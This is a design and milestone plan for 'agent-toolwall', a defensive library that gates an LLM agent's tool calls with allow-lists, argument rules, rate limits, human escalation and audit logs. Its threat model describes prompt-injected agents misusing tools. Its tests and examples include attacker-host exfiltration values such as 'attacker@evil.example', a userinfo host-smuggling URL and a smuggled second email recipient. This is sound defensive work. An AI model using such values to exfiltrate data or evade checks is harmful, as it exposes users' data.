# agent-toolwall — Implementation Plan (v1)

Status: plan of record. Version 0.1.0 target. Written 2026-08-19.
Execution model: each milestone below is a self-contained task intended to be
handed to a one-shot `codex "..."` invocation by an executor with no memory of
prior context. Review is done separately against the acceptance criteria.

Sibling projects: `agent-injection-bench` (offense/measurement) and
`modelscan-eval` (supply-chain scanning). This repo is the defensive one: the
deliverable is a library someone installs, not a number someone cites.

---

## 1. Problem statement and novel angle

A tool-using LLM agent decides to call `send_email(to=..., body=...)` and the
application executes it. Between those two events there is, in almost every
agent stack shipping today, nothing — no check that the tool was permitted for
this task, no check that the recipient is one the user would recognise, no rate
limit, no human in the loop for a $500 purchase, and no record afterwards of
what was attempted. Every mitigation for indirect prompt injection that operates
*before* this point (delimiting, datamarking, detectors) is probabilistic: it
tries to stop the model from being persuaded. The check at this point is not
probabilistic — the arguments are already concrete and structured, and a policy
over them either matches or does not. `agent-toolwall` is a small, framework-
agnostic library that occupies that gap: it turns "the agent wants to call tool
T with args A" into an explicit `Decision` (allow / deny / escalate), enforces
allow-lists, argument constraints, and rate limits, routes sensitive actions to
a caller-supplied human-approval hook, and writes an audit record for **every**
decision including the allowed ones.

**Prior art, and what is reused vs. new.**

| Work | What it does | Relationship here |
|---|---|---|
| Guardrails AI, NeMo Guardrails, Rebuff | Validate/filter LLM *text* — input prompts, output content, conversational rails | Reused: the interception-point idea (a library that sits in the loop and can refuse). Different: toolwall never sees model text. Its entire input is `(tool_name, args, context)` after the model has decided, before the effect. Content filtering is explicitly out of scope (§10). |
| OPA / Open Policy Agent, casbin | General-purpose policy engines; Rego or model/matcher files; often an out-of-process sidecar | Reused: allow/deny policy shape, default-deny posture, decision logging as a first-class output. Different: no policy DSL and no sidecar. Policies are Python callables; the YAML file is a thin surface over four built-in rule types, not a language. Neither ships the two primitives the agent case needs: a per-tool rate limiter and a human-approval decision effect. |
| API gateways / WAFs / rate-limit middleware | Allow-lists and quotas at the HTTP layer | Toolwall enforces at the *semantic tool* layer, above transport, on typed arguments (`to`, `path`, `amount`) rather than on request bytes. A gateway cannot express "this file write is fine under `/workspace` and not under `/etc`" without re-parsing the agent's intent. |
| `agent-injection-bench` (sibling) | Measures how often indirect prompt injection succeeds, and how much each mitigation helps | Direct complement. That project's `egress_filter` defense arm is, conceptually, a one-policy toolwall hard-coded into a benchmark harness. This project extracts that idea into something installable, generalises it (arg rules, rate limits, escalation, audit), and demonstrates it against the same scenario *shapes* (§7) — without importing a line of that repo's code. The two together read as: measure the problem, then ship part of the fix. |

**The novel angle is four specific properties, none of which the above combine:**

1. **Escalation as a first-class decision effect.** Not `allow`/`deny` with an
   exception hack — `ESCALATE` is a third effect, resolved by a caller-supplied
   callback, and its resolution is recorded. A library with no UI can still
   define a correct human-in-the-loop contract (§6).
2. **Every decision is audited, including allows.** A firewall that only logs
   blocks cannot answer "what did the agent actually do", which is the question
   asked after an incident.
3. **Anti-bypass normalisation as a tested security property, not a footnote.**
   Tool-name casing, Unicode-confusable argument keys, and payloads nested
   inside lists/dicts are each covered by a named test (§8). "The policy said
   deny but the call went through" is the only bug class that matters here.
4. **Validated against attack scenarios, not just unit tests.** The demo (§7)
   runs an agent loop unprotected and protected, with fake tools that record
   real side effects, and asserts the difference. That is the artifact.

---

## 2. Scope: what "intercepting a tool call" means

### The integration point

Toolwall does not wrap the model, the agent framework, or the tool registry. It
wraps exactly one moment. The caller's loop already looks like:

```
model returns tool_calls  ->  app dispatches to a Python function  ->  result back to model
                          ^
                          toolwall goes here
```

Two calling conventions, both in `toolwall/engine.py`:

- **`Toolwall.check(tool: str, args: dict, context: dict | None = None) -> Decision`**
  The primitive. Pure, synchronous, no I/O except the audit write and (if the
  decision escalates) the escalation callback. The caller inspects
  `decision.effect` and decides what to do. This is what an integration into a
  framework we have never heard of uses.
- **`Toolwall.call(tool: str, args: dict, fn: Callable[..., Any], context=None) -> Any`**
  Convenience: runs `check`, and on `ALLOW` calls `fn(**decision.args)`, on
  anything else raises `ToolCallBlocked(decision)`. Saves the caller five lines
  and, more importantly, guarantees the executed args are the ones the engine
  approved (see the TOCTOU note below).

Nothing else. No decorator, no framework adapters, no middleware base class —
see §3 "what we did NOT build".

**TOCTOU / arg identity.** `check()` deep-copies the incoming args on entry (it
must never mutate the caller's dict) and returns the approved args on
`Decision.args`. Callers using `check()` directly are documented to execute
`decision.args`, not the dict they passed in. This matters because one rule type
can redact (§5).

### In scope for v1

- Four policy types: tool allow/deny-list, argument rules, rate limit, sensitive
  action escalation (§5).
- Policies expressible as declarative YAML/JSON, or constructed directly in
  Python.
- One extension point: a policy is `Callable[[ToolCall], Decision | None]`.
- Audit log as JSON Lines.
- A demo with fake tools and observable side effects.

### Explicitly out of scope for v1

See §10 for the full list. The three that matter most for framing:

- **Model/content filtering.** Toolwall never sees prompts, completions, or tool
  *results*. Only `(tool, args, context)`.
- **Sandboxing.** Toolwall is a chokepoint, not a capability boundary — see the
  threat-model limitation below.
- **A policy language.** The YAML is a config file for four rule types. Anything
  it cannot express is a five-line Python function.

### Threat model, and what toolwall does not defend against

State this plainly in the README too; a reviewer will look for it.

Toolwall assumes the *application* is trusted and the *model's decisions* are
not. It governs only calls routed through `check()`/`call()`. It therefore does
**not** protect against:

- **Tool access that bypasses the chokepoint.** If the agent process can invoke
  the tool by another path (a second client, a shell, an unwrapped SDK call),
  toolwall never sees it. It is not a sandbox and does not claim to be.
- **Harm expressible entirely within allowed calls and allowed arguments.** If
  `send_email` to `example.com` is permitted, an injected instruction that emails
  a colleague something misleading is not blocked. This is the residual
  confused-deputy risk and it is real.
- **Injection itself.** Toolwall does not detect malicious instructions; it
  constrains the consequences of following them. Pairing it with a detector is
  the sibling project's territory.
- **A compromised policy file.** Policies are trusted input. Loading a policy
  file an attacker controls is equivalent to disabling the firewall.

---

## 3. Architecture

### Repo layout

```
agent-toolwall/
├── README.md              # the sales pitch — under a minute to read (M8)
├── PLAN.md                # this file
├── LICENSE                # MIT
├── pyproject.toml         # hatchling; runtime dep: pyyaml. extras: llm, dev
├── toolwall/
│   ├── __init__.py        # __version__ + public API re-exports
│   ├── types.py           # ToolCall, Effect, Decision, exceptions
│   ├── engine.py          # Toolwall: check(), call(), ordering, fail-closed,
│   │                      #   escalation hooks (auto_deny, cli_confirm)
│   ├── policies.py        # built-in policy factories
│   ├── loader.py          # YAML/JSON -> policies, strict validation, --validate CLI
│   ├── audit.py           # AuditLog (file or in-memory)
│   ├── demo.py             # attack scenarios + fake tools + main() (M7)
│   └── demo_policy.yaml    # the policy the demo enforces (package data)
└── tests/
    ├── test_engine.py  test_policies.py  test_normalize.py
    ├── test_ratelimit.py  test_escalate.py  test_audit.py
    ├── test_loader.py  test_demo.py
```

Pure text. Expected repo size < 1 MB. No datasets, no weights, no caches.

Python 3.11+. Runtime dependency: `pyyaml`, and nothing else. JSON policy files
are handled with stdlib `json`. **No `jsonschema`** — the policy schema is small
enough that a hand-written validator produces better error messages in fewer
lines than a schema plus its dependency.

### Core abstractions

Five, all small. No ABCs, no registry, no plugin discovery.

**`Effect`** — `str`-valued enum: `ALLOW`, `DENY`, `ESCALATE`.

**`ToolCall`** — frozen dataclass: `tool: str`, `args: dict`, `context: dict`.
`context` is free-form and caller-supplied (`{"session_id": ..., "user_id": ...,
"task": ...}`); the library reads it only where a policy asks it to (rate-limit
keying). Also carries the normalised forms used for matching:
`norm_tool: str`, `norm_args: dict` (§4 M2 defines normalisation).

**`Decision`** — frozen dataclass:
```
effect: Effect
reason: str          # human-readable, appears in the audit log and the exception
policy: str          # name of the deciding policy, e.g. "arg_rules:send_email.to"
args: dict           # the args approved for execution (== input args unless redacted)
```

**`Policy`** — a plain callable `(ToolCall) -> Decision | None`. `None` means
"no opinion, next policy". This is the *only* extension point. Built-in policies
are closures produced by factories in `policies.py`; a user policy is just a
function. No base class to subclass, no registration.

**`Toolwall`** (the engine) — constructed as
`Toolwall(policies: list[Policy], default: Effect, audit: AuditLog | None = None,
escalate: Callable | None = None)`.

Evaluation contract (this is the security-critical part; spell it out in
docstrings):

1. Deep-copy the args. Build the normalised `ToolCall`.
2. Evaluate policies in list order, threading `Decision.args` forward when a
   policy returns modified args.
3. **First `DENY` short-circuits.** Remaining policies are not evaluated.
4. `ESCALATE` is remembered but does not short-circuit — a later policy may
   still `DENY`, and a call that is going to be denied must never prompt a
   human.
5. If any policy raised an exception, the whole check resolves to `DENY` with
   `reason="policy_error: <repr>"` and the exception recorded in the audit
   record. Never propagate, never fall through to allow.
6. If no policy returned anything and no escalation is pending, the result is
   `Decision(effect=default, reason="default")`.
7. If an escalation is pending and nothing denied, invoke the escalation
   callback (§6) and resolve to `ALLOW` or `DENY` accordingly.
8. Write exactly one audit record. Return.

**`AuditLog`** — `AuditLog(path: str | Path | None = None, redact: Iterable[str] = ())`.
Appends one JSON object per line to `path`, flushing after each write; with
`path=None` it accumulates into `.records` (used by tests and by the demo).
Argument keys named in `redact` are replaced with `"<redacted>"` before writing —
agent tool args routinely contain credentials, and an audit log that leaks them
is a downgrade, not an upgrade. Record shape:

```json
{
  "ts": "2026-08-19T12:00:00.123Z",
  "toolwall_version": "0.1.0",
  "tool": "send_email",
  "args": {"to": "attacker@evil.example", "body": "..."},
  "context": {"session_id": "s1"},
  "effect": "deny",
  "reason": "arg_rules: send_email.to host 'evil.example' not in allow_hosts",
  "policy": "arg_rules:send_email.to",
  "escalated": false,
  "approved": null,
  "error": null,
  "duration_ms": 0.4
}
```

`approved` is `null` unless `escalated` is true. `args` is the *incoming* args
(post-redaction), so the log records what was attempted, not what was permitted.

### What we did NOT build, and why

Written down so a reviewer sees the omissions were decisions.

- **No plugin architecture / entry-point registry.** A policy is a callable and
  the registry is `list[Policy]`. Discovery machinery for a list literal is
  ceremony.
- **No policy DSL (Rego, CEL, expression parser).** The YAML maps 1:1 onto four
  rule types. The moment a user needs `if amount > 100 and hour < 9`, they write
  a Python function and append it to the list — which is strictly more powerful
  than any DSL v1 could ship, and zero code for us.
- **No conditional escalation in YAML** (`sensitive_if: {arg: amount, gt: 100}`).
  That is the first step down the DSL road. `sensitive: true` per tool in YAML;
  conditional sensitivity is the motivating example for the Python extension
  point, and the README shows it in six lines.
- **No async API.** `check()` is CPU-only and sub-millisecond; an async agent
  can call it inline. The one blocking case is a human-approval callback, which
  blocks the caller's thread *by design* — that is what "wait for a human"
  means. Add `acheck()` when someone has an async approval backend, not before.
- **No framework adapters** (LangChain, LlamaIndex, OpenAI tools, MCP). Each is
  a five-line wrapper around `check()`. The README shows the snippets; shipping
  them as modules means owning four dependency matrices for twenty lines of
  code. This is also what "framework-agnostic" has to mean to be credible.
- **No distributed / persistent rate limiting.** In-process `collections.deque`
  of monotonic timestamps behind a `threading.Lock`. Documented ceiling: per
  process. `# ponytail: in-process only; swap the counter for Redis if you run
  multiple workers.`
- **No tamper-evident audit log.** Plain JSONL. Hash-chaining or signing is v2
  and only matters once the log is a compliance artifact rather than a debugging
  one.
- **No RBAC / subject model / tenancy.** `context` is a free dict; a policy that
  wants roles reads `context["role"]`.
- **No policy hot-reload, no schema versioning beyond a `version: 1` key, no
  decision caching, no metrics/OpenTelemetry exporter, no dashboard.**
- **No `jsonschema` dependency.** ~60 lines of hand-rolled validation with
  pointed error messages beats a dependency plus generic ones.
- **No arg rewriting except one bounded case.** The `denies` rule may be
  configured `on_violation: redact` (§5). Everything else validates and denies.
  Silent mutation of an agent's arguments is a footgun; it is opt-in per rule
  and the audit record notes it.

---

## 4. Milestones

Ordered so **M1 alone is runnable and demoable**: wrap one tool call, apply one
allow/deny policy, get a `Decision`. Everything after layers onto a suite that
stays green.

> **Preamble for every task below.** Each task is written to be pasted into a
> single `codex "..."` invocation. Prepend this to each:
>
> *"Repo: `/Users/uiseo/Documents/research/agent-toolwall` — a small, framework-
> agnostic Python library that sits between an LLM agent's decision to call a
> tool and the tool executing, and returns an allow/deny/escalate Decision based
> on policies over `(tool_name, args, context)`. Python 3.11+, `pytest`, package
> import name `toolwall`. Read `PLAN.md` §2, §3 and §5 for the integration
> point, core abstractions, evaluation contract, and policy semantics before
> writing code; follow them exactly. The only runtime dependency permitted is
> `pyyaml` — do not add others. Do not add abstractions the plan does not call
> for (no ABCs, no plugin registry, no framework adapters, no async API). All
> tests must pass offline with no network access and no API keys set. Security
> rule that overrides convenience everywhere: when in doubt, fail closed."*

---

### M1 — Vertical slice: one tool call, one policy, one Decision · Size: M

**Goal.** `pip install -e .` works, and a caller can wrap a single tool call
with a tool-name allow-list and get back a `Decision`. No arg rules, no rate
limits, no escalation, no audit file, no YAML.

**Files.** `pyproject.toml`, `LICENSE` (MIT), `toolwall/__init__.py`,
`toolwall/types.py`, `toolwall/engine.py`, `toolwall/policies.py`
(`tool_allowlist`, `tool_denylist` only), `tests/test_engine.py`,
`README.md` (quickstart only; the full README is M8).

**Details.**
- `types.py`: `Effect`, `ToolCall`, `Decision`, `ToolCallBlocked(Exception)`
  carrying `.decision`, `PolicyError(Exception)` (used by the loader in M6).
- `engine.py`: `Toolwall` per the §3 evaluation contract, minus escalation
  (step 7 is a no-op stub that raises `NotImplementedError` if reached — no
  escalating policies exist yet) and minus audit (step 8 no-op). Implement
  steps 1-6 fully, including deep-copy of args and the policy-exception →
  `DENY` path.
- `policies.py`: `tool_allowlist(names: Iterable[str]) -> Policy` returns
  `ALLOW` on match, `None` otherwise (so `default` decides the rest);
  `tool_denylist(names)` returns `DENY` on match, `None` otherwise. The literal
  string `"*"` in either list matches every tool.
- `Toolwall(default=...)` accepts `Effect.DENY` or `Effect.ALLOW` and has **no
  default value** — the caller must state the posture explicitly.
- `__init__.py` exports `Toolwall, Decision, Effect, ToolCall, ToolCallBlocked`
  and `__version__ = "0.1.0"`.
- `pyproject.toml`: hatchling backend, name `agent-toolwall`, import package
  `toolwall`, `requires-python = ">=3.11"`, `dependencies = ["pyyaml>=6"]`,
  `[project.optional-dependencies] dev = ["pytest"]`, MIT, repo URL
  `https://github.com/euisuh/agent-toolwall`.

**Acceptance criteria.**
1. `pip install -e ".[dev]"` succeeds in a clean venv, then
   `python -c "import toolwall; print(toolwall.__version__)"` prints `0.1.0`.
2. `pytest` passes, offline, in under 10 seconds.
3. A test builds `Toolwall([tool_allowlist(["read_file"])], default=Effect.DENY)`
   and asserts: `check("read_file", {"path": "a"})` → `ALLOW`;
   `check("send_email", {})` → `DENY` with `reason == "default"`.
4. A test asserts the mirror case with `tool_denylist` and `default=Effect.ALLOW`.
5. A test asserts `Toolwall([], default=Effect.DENY)` denies every call (an
   engine with no policies is a closed firewall, not an open one).
6. A test asserts a policy that raises `ValueError` yields `DENY` with `reason`
   starting `policy_error:`, and that the exception does not propagate.
7. A test asserts `check()` does not mutate the caller's args dict (pass a dict,
   assert it is unchanged and that `decision.args is not` the input object).
8. A test asserts `call()` executes the function on `ALLOW` and raises
   `ToolCallBlocked` (with `.decision.effect == DENY`) otherwise, and that the
   function is **not** called when blocked.
9. README contains a copy-pasteable 15-line quickstart that matches criterion 3.

---

### M2 — Argument rules and normalisation (the anti-bypass milestone) · Size: M

**Goal.** Policies over argument *values*, plus the normalisation that makes
them non-trivial to evade. This is the milestone a security reviewer reads
hardest.

**Files.** `toolwall/policies.py` (`arg_rules`), `toolwall/types.py`
(normalisation helpers on `ToolCall` construction), `tests/test_policies.py`,
`tests/test_normalize.py`.

**Details.**
- **Normalisation, applied when `ToolCall` is built** (raw values are preserved
  for the audit log; matching uses the normalised forms):
  - `norm_tool = unicodedata.normalize("NFKC", tool).casefold()`. Built-in
    policies match against `norm_tool`, so `Send_Email`, `SEND_EMAIL`, and the
    fullwidth `ｓｅｎｄ＿ｅｍａｉｌ` all hit a rule written for `send_email`.
  - Argument **keys** are NFKC-normalised and casefolded the same way. If two
    distinct raw keys collide after normalisation (e.g. ASCII `to` and Cyrillic
    `tо`), the call is **denied** with `reason="ambiguous argument keys: ..."` —
    there is no correct way to guess which one the tool will read.
  - Argument **values** are matched after NFKC normalisation. Non-string values
    (int, bool, list, dict, None) are matched by recursively walking the
    structure; every string found anywhere in the tree is subject to the
    pattern rules. A payload hidden in `{"meta": ["x", "CANARY-7F3A"]}` is found.
    Depth is capped at 20 and total scanned strings at 10 000; exceeding either
    is a `DENY`, not a truncation.
- **`arg_rules(rules: dict) -> Policy`**, where `rules` maps tool name → arg
  name → constraint dict. Both keys accept `"*"` to mean "every tool" / "every
  argument"; `"*"` rules are evaluated **before** tool-specific ones. Supported
  constraints (all optional, all documented in §5): `required`, `type`,
  `max_len`, `enum`, `matches`, `denies`, `allow_hosts`, `on_violation`.
- **`allow_hosts` semantics** (the single highest-value rule; get it exactly
  right):
  - The value is parsed as a URL if it contains `://`, else as an email address
    if it contains exactly one `@`, else the whole string is treated as a host.
  - URL host is `urllib.parse.urlsplit(v).hostname` — which correctly discards
    the userinfo, so `https://example.com@evil.example/x` yields `evil.example`
    and is denied.
  - Anything that fails to parse, or yields no host, is **denied**.
  - A value containing a comma or whitespace is denied unless the rule's `type`
    is `list` (no smuggling a second recipient into a single string).
  - Host comparison is casefolded and IDNA-normalised
    (`host.encode("idna")`, denying on `UnicodeError`). An entry beginning with
    `.` (e.g. `.example.com`) matches subdomains; a bare entry matches that host
    exactly and no subdomain.
- A rule violation produces `DENY` with `policy="arg_rules:<tool>.<arg>"` and a
  reason naming the constraint and the offending value.

**Acceptance criteria.**
1. Positive/negative test per constraint type (`required`, `type`, `max_len`,
   `enum`, `matches`, `denies`, `allow_hosts`).
2. `tests/test_normalize.py` covers, each as a named test:
   - `SEND_EMAIL` and the fullwidth form both match a `send_email` rule;
   - a Cyrillic-`о` `tо` key alongside ASCII `to` → `DENY` naming ambiguity;
   - a deny-pattern match found inside a nested list and inside a nested dict
     value;
   - depth-limit and count-limit exceeded → `DENY`, not silent pass.
3. `allow_hosts` tests, each named:
   - `https://example.com@evil.example/x` → **DENY**;
   - `https://EXAMPLE.COM/x` with `allow_hosts: [example.com]` → ALLOW;
   - `https://sub.example.com` → DENY for `[example.com]`, ALLOW for
     `[.example.com]`;
   - `"ok@example.com, attacker@evil.example"` in a string arg → DENY;
   - `"not a url"` and `""` → DENY (unparseable fails closed);
   - `http://127.0.0.1:8080/x` → DENY unless explicitly allow-listed.
4. `"*"`/`"*"` rules apply to a tool with no specific entry; a test asserts a
   global `denies: "CANARY-[0-9A-F]{4}"` blocks the token in any argument of any
   tool.
5. A test asserts `on_violation: redact` replaces the matched substring with
   `[REDACTED]` in `decision.args`, returns `ALLOW`, and that the audit-visible
   reason records the redaction (audit itself lands in M4).
6. Ordering test: when both a `"*"` rule and a tool-specific rule would fire, the
   `"*"` deny wins and the tool-specific rule is not consulted.

---

### M3 — Rate limiting · Size: S

**Goal.** Per-tool sliding-window rate limits, keyed optionally on context.

**Files.** `toolwall/policies.py` (`rate_limit`), `tests/test_ratelimit.py`.

**Details.**
- `rate_limit(tool: str, max_calls: int, per_seconds: float, key: Sequence[str] = ()) -> Policy`.
- Window key is `(norm_tool, *[context.get(k) for k in key])`. Default key is
  the tool alone.
- State: `dict[key, deque[float]]` of `time.monotonic()` timestamps, guarded by
  one `threading.Lock`. Timestamps older than `per_seconds` are evicted on each
  check. `# ponytail: in-process; per-key deque is fine to ~10^4 keys.`
- **Only calls that end up ALLOWED consume budget.** The policy therefore cannot
  record its timestamp at evaluation time — the engine notifies the policy after
  the final decision. Implement this as: the rate-limit closure exposes a
  `commit(toolcall)` attribute, and `Toolwall` calls `commit()` on every policy
  that has one, once, after the decision resolves to `ALLOW`. Policies without
  a `commit` attribute are unaffected. (This is the one place the plan permits a
  second protocol beyond `(ToolCall) -> Decision | None`; it exists because the
  alternative — a rate limiter that penalises the caller for calls the firewall
  itself blocked — is wrong.)
- Exceeding the limit yields `DENY`, `policy="rate_limit:<tool>"`, reason naming
  the limit and the window.
- `rate_limit` uses `time.monotonic()`, never wall clock, and tests inject a
  clock function rather than sleeping.

**Acceptance criteria.**
1. With `max_calls=3, per_seconds=60`: calls 1-3 ALLOW, call 4 DENY.
2. Advancing the injected clock past the window re-allows.
3. A call denied by an earlier policy (e.g. `arg_rules`) does **not** consume
   budget: after 5 denied-by-argrules calls, 3 valid calls still succeed.
4. A call denied *by the rate limit itself* does not extend the window (no
   penalty box): a test asserts the window empties on schedule regardless of
   rejected attempts.
5. Keying by `context["session_id"]` isolates sessions: session A exhausting its
   budget does not affect session B.
6. Concurrency: 8 threads issuing 100 calls each against `max_calls=50` results
   in exactly 50 ALLOWs (asserted, not approximated).

---

### M4 — Audit log · Size: S

**Goal.** Exactly one durable JSON record per decision, allows included.

**Files.** `toolwall/audit.py`, `toolwall/engine.py` (wire step 8),
`tests/test_audit.py`.

**Details.**
- `AuditLog(path=None, redact=())` per §3. `path=None` → records accumulate in
  `.records` (list of dicts) and nothing is written.
- Writes are append-mode, one `json.dumps(...)` + `"\n"` per record, `flush()`
  after each. Non-JSON-serialisable argument values are coerced with
  `default=repr` rather than raising — an audit write must never be the thing
  that breaks a tool call.
- Redaction applies to normalised argument key names, matched casefolded, at any
  depth of the arg tree.
- The engine writes the record in a `finally` block so a record exists even if
  something after the decision raises.

**Acceptance criteria.**
1. One `check()` → exactly one record. Ten checks → ten lines in the file.
2. Allowed calls are recorded (assert an `effect == "allow"` line exists) — this
   is the criterion that distinguishes an audit log from a block log.
3. Every §3 record key is present with the right type; `toolwall_version`
   matches `toolwall.__version__`.
4. Redaction: `AuditLog(redact=["api_key"])` with args
   `{"api_key": "sk-real", "nested": {"API_KEY": "sk-real"}}` produces a record
   whose serialised JSON does not contain `sk-real` anywhere.
5. Records are readable from a second file handle while the writing process is
   still open (flush-per-line verified, not assumed).
6. An argument value that is not JSON-serialisable (e.g. an object) still
   produces a valid JSON line.
7. A policy that raises produces a record with `effect == "deny"` and a non-null
   `error` containing the exception repr.

---

### M5 — Sensitive-action escalation · Size: S

**Goal.** The `ESCALATE` effect, the callback contract, and the two shipped
implementations.

**Files.** `toolwall/policies.py` (`sensitive`), `toolwall/engine.py`
(escalation resolution + `auto_deny`, `cli_confirm`), `tests/test_escalate.py`.

**Details.** Full specification in §6. Key points for implementation:
- `sensitive(tools: Iterable[str]) -> Policy` returns
  `Decision(ESCALATE, ...)`; it does not short-circuit.
- `Toolwall(escalate=...)` defaults to `auto_deny` so a headless caller who
  never configures anything gets a safe, non-blocking answer.
- Callback contract: `(ToolCall, Decision) -> bool`. Anything other than a
  literal `True` — `False`, `None`, a truthy non-bool, an exception — resolves
  to `DENY`. Rationale in §6.
- `cli_confirm` prints the tool name and a pretty-printed arg dict, reads one
  line from stdin, accepts only `y`/`yes` (casefolded, stripped). If
  `sys.stdin.isatty()` is false it returns `False` immediately without reading —
  no agent should ever hang forever on a pipe.

**Acceptance criteria.**
1. Default engine (`escalate` unset) + a `sensitive` policy → `DENY` with
   `escalated: true, approved: false` in the audit record. No prompt, no hang.
2. A callback returning `True` → `ALLOW` with `escalated: true, approved: true`.
3. A callback returning `"yes"` (truthy, not `True`) → `DENY`.
4. A callback raising → `DENY`, exception in the audit `error` field.
5. **A call already denied by an earlier policy never invokes the callback** —
   assert with a callback that records invocations and a policy list where
   `arg_rules` denies and `sensitive` escalates, in both orders.
6. `cli_confirm` with a fake non-tty stdin returns `False` without reading.
7. `cli_confirm` with stdin `"y\n"` and a faked tty returns `True`; `"n\n"`,
   `""`, `"Y E S"` all return `False`.

---

### M6 — Declarative policy loading · Size: M

**Goal.** Load the whole configuration from one YAML (or JSON) file, with
validation strict enough that a typo cannot silently open the firewall.

**Files.** `toolwall/loader.py`, `toolwall/__init__.py` (export
`load_policy_file`, `Toolwall.from_file`), `tests/test_loader.py`.

**Details.**
- Format (full semantics in §5):

```yaml
version: 1
default: deny                 # REQUIRED. deny | allow. No implicit value.
audit:
  path: outputs/audit.jsonl   # optional
  redact: [api_key, password]
tools:
  read_file:
    allow: true
    args:
      path: {type: str, required: true, matches: "^/workspace/"}
  http_get:
    allow: true
    rate_limit: {max: 5, per_seconds: 60, key: [session_id]}
    args:
      url: {type: str, required: true, allow_hosts: [".example.com", docs.python.org]}
  send_email:
    allow: true
    sensitive: true
    args:
      to: {type: str, required: true, allow_hosts: [example.com]}
  submit_order:
    allow: true
    sensitive: true
  "*":
    args:
      "*": {denies: "CANARY-[0-9A-F]{4}"}
```

- `load_policy_file(path) -> tuple[list[Policy], Effect, AuditLog | None]`, and
  `Toolwall.from_file(path, escalate=None)` as the one-liner most users call.
- **Emitted policy order is fixed and documented**: global (`"*"`) arg rules →
  tool allow/deny → tool-specific arg rules → rate limits → sensitive. Deny-
  before-escalate falls out of this ordering.
- A tool listed with `allow: false` produces a deny-list entry. A tool not
  listed at all is governed by `default`.
- **Validation, all of which are hard errors raising `PolicyError` with the
  offending key path:** missing or non-`1` `version`; missing `default`;
  `default` not in `{deny, allow}`; unknown top-level key; unknown key inside a
  tool block; unknown key inside an arg constraint block; `matches`/`denies`
  that fail `re.compile`; `rate_limit.max` not a positive int; `allow_hosts`
  not a list of non-empty strings; `enum` not a list; `type` not in the
  supported set. There is no lenient mode and no warn-and-continue path.
- `python -m toolwall.loader --validate <path>` prints the resolved policy list
  in order (one line per emitted policy) and exits 0, or prints the error and
  exits 1.

**Acceptance criteria.**
1. `python -m toolwall.loader --validate toolwall/demo_policy.yaml` exits 0 and
   prints the ordered policy list.
2. A round-trip test: a file-loaded engine and a hand-constructed engine with
   the equivalent policies produce identical decisions across a table of ~10
   `(tool, args)` cases.
3. One named test per rejection case listed above (≥10 tests), each asserting
   `PolicyError` and that the message names the offending key path.
4. **Fail-closed on malformed input**: a file that is not valid YAML, a file
   that is valid YAML but not a mapping, and an empty file each raise
   `PolicyError`. A test asserts no `Toolwall` is constructed and no partial
   policy list is returned — the failure mode is "refuses to start", never
   "starts with fewer rules".
5. A policy file omitting `default` is rejected (a test asserts this explicitly;
   the whole point is that the posture is never inferred).
6. `.json` files with the same structure load identically to `.yaml` (one test
   comparing decisions from both).
7. Unknown keys are rejected, not ignored — a test with `allw: true` (typo)
   raises rather than silently producing a tool with no allow rule.

---

### M7 — The demo: attack scenarios, unprotected vs. protected · Size: L

**Goal.** The artifact that proves this works. One command, six scenarios, two
arms, a printed table, and a nonzero exit if reality disagrees with the plan.

**Files.** `toolwall/demo.py`, `toolwall/demo_policy.yaml`, `pyproject.toml`
(`[project.scripts] toolwall-demo = "toolwall.demo:main"`), `tests/test_demo.py`,
`README.md` (paste the output).

**Details.** Full scenario specification in §7. Structure:
- **Fake world** (`demo.py`): module-level `World` dataclass with
  `sent_emails: list`, `http_gets: list`, `orders: list`, `files_written: list`.
  Six fake tools mutate it. No network, no filesystem writes, no real I/O.
- **Fake agent**: a scripted "model" that, for each scenario, emits the sequence
  of tool calls an agent following an injected instruction would emit. Default
  `--model mock`; deterministic; zero dependencies. It is deliberately naive —
  the demo's claim is about what toolwall blocks, not about how the model was
  fooled (that claim belongs to `agent-injection-bench`).
- **Two arms per scenario**: `unprotected` calls the tools directly;
  `protected` routes every call through `Toolwall.from_file("demo_policy.yaml",
  escalate=auto_deny)` and catches `ToolCallBlocked`.
- **Expected outcomes are declared in the scenario table** (attacker-goal
  achieved: yes/no per arm), and `main()` asserts them, exiting 1 on any
  mismatch. The demo is therefore also the integration test.
- **Output**: a Markdown table to stdout — scenario | attack goal | unprotected
  | protected | blocking policy — plus a summary line
  `blocked 5/5 attacks, allowed 1/1 benign task` and the path of the audit log
  written under `outputs/`.
- `--audit PATH` and `--escalate {auto_deny,cli_confirm}` flags; `--scenario ID`
  to run one.

**Acceptance criteria.**
1. `pip install -e .` then `toolwall-demo` exits 0 and prints the table.
2. In the `unprotected` arm, the attacker goal is achieved for all five attack
   scenarios — asserted against `World` state (e.g.
   `world.sent_emails[0]["to"] == "attacker@evil.example"`). A demo where the
   unprotected arm does not actually get exploited proves nothing.
3. In the `protected` arm, `World` shows **zero** attacker side effects across
   all five attack scenarios, and each block names the responsible policy.
4. The benign control scenario is **ALLOWED** in the protected arm and its
   legitimate side effect occurs — a firewall that denies everything is not a
   result.
5. `toolwall-demo` writes an audit log containing one record per attempted call
   in the protected arm, allows and denies both.
6. `tests/test_demo.py` runs `main()` in-process with a temp audit path and
   asserts the same outcomes, so the demo is covered by `pytest` and cannot rot.
7. A deliberately broken policy file (attack scenario expectations flipped)
   causes `main()` to exit 1 — assert the self-check actually fails when it
   should.
8. Runs offline in under 5 seconds with no API key set.

---

### M8 — Packaging, README, release · Size: M

**Goal.** Make it installable, inspectable, and sellable in under a minute.

**Files.** `README.md`, `pyproject.toml`, `LICENSE`, git tag `v0.1.0`.

**Details.** README structure, in this order, ~150 lines total:
1. One-sentence pitch and a three-line "what it does" list.
2. The demo table from M7, pasted verbatim, above the fold.
3. Install (`pip install -e .`) and the 15-line usage snippet.
4. The policy YAML example.
5. Integration snippets for three shapes — a raw OpenAI/Anthropic tool-call
   loop, a generic `dispatch(name, args)` router, and an MCP-style server — five
   lines each, in the README, not in the package.
6. "What this is not": not a content filter, not a sandbox, not an injection
   detector; the §2 threat-model limitations, honestly stated.
7. One paragraph on the relationship to `agent-injection-bench`.

**Acceptance criteria.**
1. `pip install -e ".[dev]"` in a clean venv, then `toolwall-demo`, then
   `pytest` — all three succeed from a fresh clone with no other setup.
2. `python -m build` (or `hatch build`) produces an sdist and a wheel; the wheel
   contains `demo_policy.yaml` as package data (assert by installing the wheel
   into a temp venv and running `toolwall-demo`).
3. README renders correctly on GitHub; every command in it has been run.
4. Repo working tree under 5 MB (`du -sh` check documented in the plan of
   record), MIT licensed, tagged `v0.1.0`, pushed to
   `github.com/euisuh/agent-toolwall`.
5. `toolwall.__version__`, the `pyproject.toml` version, and the git tag agree
   (a test asserts the first two).

---

